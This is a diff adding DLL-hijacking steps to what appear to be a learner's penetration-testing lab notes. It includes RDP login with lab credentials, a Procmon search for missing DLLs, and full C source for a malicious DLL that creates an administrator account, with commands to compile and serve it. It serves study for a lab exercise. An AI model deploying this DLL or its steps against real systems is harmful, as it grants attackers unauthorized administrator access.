@@ -2089,6 +2089,49 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
     type C:\Users\roy\Desktop\flag.txt
     ```
 - 17.2.2 DLL Hijacking
+  - RDP to target and look for vulnerable DLL  
+    ```
+    xfreerdp3 /u:steve /p:securityIsNotAnOption++++++ /v:192.168.185.220 /cert:ignore /drive:share,/home/kali/share  
+    Get-CimInstance Win32_Service -Filter "Name='mysql'" | Select-Object Name, StartName, PathName //File Zilla  
+    ```
+  - Use Procmon to filter events to look for malicious dll  
+    run C:\tools\Procmon\Procmon64.exe (password:admin123admin123! for backupadmin)  
+    - Filter by  process name: xxx.exe  
+    - Filter by operation is 'CreateFile', Result is 'Name not found', Path contains '.dll'  
+  - Kali create malicious dll to add new user 'dave3'  
+    ```
+    nano TextShaping.cpp
+
+    #include <stdlib.h>
+	#include <windows.h>
+	
+	BOOL APIENTRY DllMain(
+	HANDLE hModule,// Handle to DLL module
+	DWORD ul_reason_for_call,// Reason for calling function
+	LPVOID lpReserved ) // Reserved
+	{
+	    switch ( ul_reason_for_call )
+	    {
+	        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
+	        int i;
+	  	    i = system ("net user dave3 password123! /add");
+	  	    i = system ("net localgroup administrators dave3 /add");
+	        break;
+	        case DLL_THREAD_ATTACH: // A process is creating a new thread.
+	        break;
+	        case DLL_THREAD_DETACH: // A thread exits normally.
+	        break;
+	        case DLL_PROCESS_DETACH: // A process unloads the DLL.
+	        break;
+	    }
+	    return TRUE;
+	}
+
+    x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll
+    python3 -m http.server 80
+    ```
+  - wait high privilege user login and trigger the dll  
+  - check new user created `net user`  
 - 17.2.3 Unquoted Service Paths
 
 ## Penetration testing report 
